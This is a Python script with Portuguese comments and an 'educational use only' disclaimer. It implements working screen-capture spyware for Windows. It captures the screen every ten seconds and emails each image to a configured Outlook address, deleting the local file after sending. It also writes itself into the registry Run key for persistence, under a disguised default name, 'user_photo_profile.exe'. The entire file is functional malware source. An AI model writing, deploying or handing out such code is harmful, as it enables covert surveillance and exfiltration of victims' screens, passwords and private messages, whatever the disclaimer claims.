# Este software é fornecido exclusivamente para fins educacionais e de aprendizado.
# O uso para capturar a tela de terceiros sem permissão é estritamente proibido e pode ser ilegal.
# O desenvolvedor não se responsabiliza por quaisquer usos inadequados ou ilegais.

import os
import time
from datetime import datetime
from PIL import ImageGrab  # Biblioteca para capturar a tela
import smtplib  # Biblioteca para enviar e-mails via SMTP
from email.mime.multipart import MIMEMultipart  # Usado para criar a estrutura do e-mail
from email.mime.base import MIMEBase  # Usado para manipular arquivos em anexo
from email import encoders  # Usado para codificar os anexos em base64
import winreg as reg  # Biblioteca para interagir com o registro do Windows

# Função para enviar o e-mail com a captura de tela
def send_email(file_path):
    # Configurações do servidor de e-mail
    smtp_server = 'smtp-mail.outlook.com'  # Servidor SMTP da Outlook/Hotmail
    smtp_port = 587  # Porta usada para envio de e-mail com STARTTLS
    sender_email = 'seu_email@outlook.com'  # Substitua pelo seu e-mail do Outlook/Hotmail
    sender_password = 'sua_senha'  # Substitua pela sua senha do e-mail
    recipient_email = 'seu_email@outlook.com'  # E-mail destinatário (enviando para você mesmo)

    # Criando a mensagem de e-mail
    msg = MIMEMultipart()  # Cria a estrutura do e-mail
    msg['From'] = sender_email  # Remetente do e-mail
    msg['To'] = recipient_email  # Destinatário do e-mail
    msg['Subject'] = 'Captura de Tela Automática'  # Assunto do e-mail

    # Anexando a imagem ao e-mail
    attachment = MIMEBase('application', 'octet-stream')  # Cria um objeto MIMEBase para o anexo
    with open(file_path, 'rb') as file:  # Abre a captura de tela no modo de leitura binária
        attachment.set_payload(file.read())  # Lê o conteúdo do arquivo e define como payload do anexo
    encoders.encode_base64(attachment)  # Codifica o anexo em base64 para enviar como e-mail
    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')  # Define o cabeçalho do anexo
    msg.attach(attachment)  # Anexa a imagem à mensagem de e-mail

    # Enviando o e-mail
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:  # Conecta ao servidor SMTP
            server.starttls()  # Inicia a conexão segura (STARTTLS)
            server.login(sender_email, sender_password)  # Faz o login no servidor SMTP
            server.sendmail(sender_email, recipient_email, msg.as_string())  # Envia o e-mail
            print('E-mail enviado com sucesso.')
    except Exception as e:
        print(f'Erro ao enviar e-mail: {e}')  # Caso ocorra um erro, imprime a mensagem de erro

# Função para capturar a tela e enviar por e-mail
def capture_screenshot():
    # Nome do arquivo com a data e hora atual
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')  # Gera um timestamp para o nome do arquivo
    file_name = f'screenshot_{timestamp}.png'  # Define o nome do arquivo
    file_path = os.path.join(os.getcwd(), file_name)  # Define o caminho para salvar a captura temporariamente no diretório atual
    
    # Capturar a tela
    screenshot = ImageGrab.grab()  # Captura a tela do usuário
    
    # Salvar a imagem
    screenshot.save(file_path)  # Salva a captura de tela como um arquivo PNG
    
    # Enviar a imagem por e-mail
    send_email(file_path)  # Chama a função para enviar o e-mail com a captura de tela
    
    # Remover o arquivo após o envio (opcional)
    os.remove(file_path)  # Remove o arquivo localmente após o envio (opcional)
    
    print(f'Captura de tela enviada e removida: {file_path}')  # Imprime mensagem de confirmação

# Função para adicionar o script à inicialização do Windows
def add_to_startup(file_path=None, name="MyApp"):
    if file_path is None:
        file_path = os.path.abspath("user_photo_profile.exe")  # Substitua pelo nome do seu arquivo .exe
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, name, 0, reg.REG_SZ, file_path)
    reg.CloseKey(reg_key)
    print(f'{name} adicionado à inicialização do Windows com sucesso.')

# Função principal que controla o intervalo de capturas de tela
def main():
    # Intervalo de tempo entre capturas (em segundos)
    interval = 10  # Define o intervalo entre as capturas de tela
    
    # Adicionar o script à inicialização do Windows
    add_to_startup()

    try:
        while True:  # Loop infinito para capturar e enviar a tela a cada 10 segundos
            capture_screenshot()  # Captura e envia a tela
            print("Screenshot tirado e salvo.")
            time.sleep(interval)  # Aguarda o intervalo definido antes de repetir
    except KeyboardInterrupt:
        print("Interrompido pelo usuário.")  # Mensagem quando o script é interrompido manualmente

# Executa a função principal quando o script é executado
if __name__ == "__main__":
    main()  # Chama a função principal
